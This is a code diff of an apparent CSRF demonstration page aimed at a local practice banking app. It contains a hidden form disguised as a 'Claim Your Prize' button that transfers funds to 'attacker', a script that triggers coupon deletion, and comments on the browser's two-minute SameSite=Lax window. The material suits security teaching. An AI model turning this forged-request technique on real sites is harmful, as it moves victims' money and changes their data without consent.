@@ -10,11 +10,12 @@
 
     <!-- Sends a POST request with top level navigation. Will work if cookie is set to 
     LAX and was created < 2 mins. -->
-    <!-- Chrome will set the cookie as LAX implicitly if not defined in the backend. You have
+    <!-- Chrome will set the cookie as LAX implicitly if not defined as LAX in the backend. You have
     ~ 2 minutes to do the transfer. -->
     <form id="csrfForm" action="http://localhost:3000/transfer" method="POST">
-        <input type="hidden" name="recipient" value="attacker">
+        <input type="hidden" name="to" value="attacker">
         <input type="hidden" name="amount" value="1000">
+        <input type="hidden" name="coupon" value="">
         <button type="submit">Claim Your Prize</button>
     </form>
 
@@ -25,7 +26,7 @@
 
     <script>
         function deleteCoupon() {
-            document.location = 'http://localhost:3000/coupon/delete?couponId=Black-Friday-Coupon';
+            document.location = 'http://localhost:3000/delete-coupon?code=ALICE50';
         }
     </script>
 </body>
